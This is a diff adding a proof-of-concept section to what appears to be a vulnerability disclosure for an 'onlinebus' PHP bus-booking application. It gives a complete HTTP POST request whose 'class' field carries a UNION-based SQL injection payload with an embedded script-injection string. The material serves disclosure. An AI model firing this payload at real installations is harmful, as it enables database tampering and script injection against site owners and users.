@@ -165,6 +165,28 @@ Parameter controllable
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/8fd359c4-0d28-4eee-bb49-3192d250810d)
 
+POC:
+```
+POST /onlinebus/book_action.php HTTP/1.1
+Host: 192.168.253.1
+Content-Length: 167
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.253.1onlinebus/book.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+source=Khandeshwar&dest=Kharghar&class=' UNION ALL SELECT NULL,NULL,NULL,NULL,"1","<script>alert(1)</script>" ORDER BY price ASC-- -&type=Single&number=1&login_submit=
+```
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/a5d348ab-2218-4c10-8369-eb635e58dac7)
+
 
 # 4. busaction.php sql injection
 
